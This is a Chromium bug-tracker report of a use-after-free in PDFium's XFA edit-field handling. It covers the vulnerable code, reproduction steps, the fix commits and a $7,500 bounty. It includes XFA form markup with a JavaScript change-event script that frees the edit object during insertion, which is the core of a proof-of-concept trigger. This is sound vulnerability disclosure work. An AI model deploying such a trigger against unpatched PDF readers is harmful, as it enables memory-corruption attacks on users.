# Security: PDFium (XFA) Use-after-free in CFWL_Edit::OnChar

| Field | Value |
|-------|-------|
| **Issue ID** | [40051528](https://issues.chromium.org/issues/40051528) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2020-02-16 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

CFWL\_Edit object use-after-free in function CFWL\_Edit::OnChar.

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe  

Press left mouse button to editbox (i set this editbox to cover all page so you can click to any place in page) then  

press 'a' keyboard button (or any character button).

DETAIL INFORMATION

The bug is in function CFWL\_Edit::OnChar()

```
void CFWL_Edit::OnChar(CFWL_MessageKey\* pMsg) {  
  if ((m_pProperties->m_dwStyleExes & FWL_STYLEEXT_EDT_ReadOnly) ||  
      (m_pProperties->m_dwStates & FWL_WGTSTATE_Disabled)) {  
    return;  
  }  
...  
    case L'\r':  
      if (m_pProperties->m_dwStyleExes & FWL_STYLEEXT_EDT_WantReturn) {  
        m_pEditEngine->Insert(m_CursorPosition, L"\n");  
        SetCursorPosition(m_CursorPosition + 1);  
      }  
      break;  
    default: {  
      if (pMsg->m_dwFlags & kEditingModifier)  
        break;  
  
      m_pEditEngine->Insert(m_CursorPosition, WideString(c));   // ==> callback to JS function and free CFWL_Edit object  
      SetCursorPosition(m_CursorPosition + 1);                  // ==> |m_CursorPosition| is used again but object was freed  
      break;  
    }  
  }  
}  

```

We can trigger JS callback when function `m_pEditEngine->Insert()` is called. By setting up `change` event for a choice list  

field like this

```
<field name="field2" h="200mm" w="200mm" x="1mm" y="1mm">  
    <ui>  
        <textEdit/>  
    </ui>  
    <value>  
        <text>pdfium</text>  
    </value>  
    <event activity="change">  
        <script contentType="application/x-javascript">  
            f2_change = f2_change + 1;  
            if (f2_change == 2)   
            {  
                f1 = xfa.resolveNode("xfa.form..field1");  
                xfa.host.setFocus(f1);  
                xfa.template.remerge();  
                xfa.host.openList(f1);     
            }  
        </script>  
    </event>  
</field>  

```

This JS code in 'change' event will be executed when command `m_pEditEngine->Insert()` is executed  

and it'll free the object CXFA\_FFTextEdit. This leads to CFWL\_Edit object is freed

After JS event handler, it backs to function `CFWL_Edit::OnChar()`, the object will be used again with  

accessing to field |m\_CursorPosition|.

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 9.4 KB)
- [log_crash.txt](attachments/log_crash.txt) (text/plain, 19.9 KB)

## Timeline

### rs...@chromium.org (2020-02-17)

[Empty comment from Monorail migration]

[Monorail components: Internals>Plugins>PDF]

### rs...@chromium.org (2020-02-17)

Tom: AFAICT, XFA is disabled for Chromium, so I'm not sure I've got the Severity set correctly, or if we even treat it as a security bug? However, I'm guessing the fact that we've got the build option means someone might set the build flags.

Are you good to check out the XFA issues? I didn't see a more specific OWNERS file.

### [Deleted User] (2020-02-17)

[Empty comment from Monorail migration]

### ts...@chromium.org (2020-02-18)

Yes, XFA=> Sev High, Impact None.  Thanks again.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-19)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/698a7fb8946ca56b4bcc14a9268df4fc6ade31f5

commit 698a7fb8946ca56b4bcc14a9268df4fc6ade31f5
Author: Tom Sepez <tsepez@chromium.org>
Date: Wed Feb 19 22:26:24 2020

Prefer retaining layout item in CXFA_FFField::OnChar().

This is more reliable than observing its destruction.

Bug: chromium:1052651
Change-Id: Ic759e1eac74b1aa8213e450b87d8c88d298ddea3
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/66690
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/698a7fb8946ca56b4bcc14a9268df4fc6ade31f5/xfa/fxfa/cxfa_fffield.cpp


### ts...@chromium.org (2020-02-19)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/69fb4d08550fb83b86236a930bd1e1ba0c779188

commit 69fb4d08550fb83b86236a930bd1e1ba0c779188
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Feb 20 02:20:43 2020

Roll src/third_party/pdfium d15d718e8d5e..c80274e041d6 (3 commits)

https://pdfium.googlesource.com/pdfium.git/+log/d15d718e8d5e..c80274e041d6

git log d15d718e8d5e..c80274e041d6 --date=short --first-parent --format='%ad %ae %s'
2020-02-19 tsepez@chromium.org Remove CFX_CSSSyntaxParser::m_iTextDataLen
2020-02-19 tsepez@chromium.org Remove some dead code from CFX_CSSSyntaxParser
2020-02-19 tsepez@chromium.org Prefer retaining layout item in CXFA_FFField::OnChar().

Created with:
  gclient setdep -r src/third_party/pdfium@c80274e041d6

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

Bug: chromium:1052651
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: I0d696bae9b4f458409fabcee472c4c4ee87d4f93
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2065406
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#742928}

[modify] https://crrev.com/69fb4d08550fb83b86236a930bd1e1ba0c779188/DEPS


### [Deleted User] (2020-02-20)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-24)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-02-27)

Congrats the Panel decided to award $7,500 for this report!

### na...@google.com (2020-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-05-28)

This issue was migrated from crbug.com/chromium/1052651?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051528)*
